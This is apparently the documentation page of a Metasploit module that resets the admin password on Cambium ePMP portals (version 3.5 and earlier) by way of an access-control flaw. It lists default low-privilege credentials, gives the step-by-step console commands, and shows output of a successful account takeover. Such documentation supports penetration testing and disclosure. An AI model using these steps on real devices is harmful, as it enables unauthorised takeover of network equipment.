This module exploits an access control vulnerability in Cambium ePMP device management portal. It requires any one of the following non-admin login credentials - installer/installer, home/home, readonly/readonly - to reset password of other existing user(s) including 'admin'. All versions <=3.5 (current as of today) are affected. The module has been tested on versions 3.0-3.5-RC7.

## Verification Steps

1. Do: ```use auxiliary/scanner/http/epmp1000_reset_pass```
2. Do: ```set RHOSTS [IP]```
3. Do: ```set RPORT [PORT]```
4. Do: ```set TARGET_USERNAME admin```
5. Do: ```set NEW_PASSWORD newpass```
6. Do: ```run```

## Sample Output

  ```
msf > use use auxiliary/scanner/http/epmp1000_reset_pass
msf auxiliary(epmp1000_reset_pass) > set rhosts 1.3.3.7
msf auxiliary(epmp1000_reset_pass) > set rport 80
msf auxiliary(epmp1000_reset_pass) > set TARGET_USERNAME admin
msf auxiliary(epmp1000_reset_pass) > set NEW_PASSWORD newpass
msf auxiliary(epmp1000_reset_pass) > run

[+] 1.3.3.7:80 - Running Cambium ePMP version 3.5...
[*] 1.3.3.7:80 - Attempting to login...
[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - "readonly":"readonly"
[*] 1.3.3.7:80 - Changing password for admin to newpass
[+] Password successfully changed!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

  ```
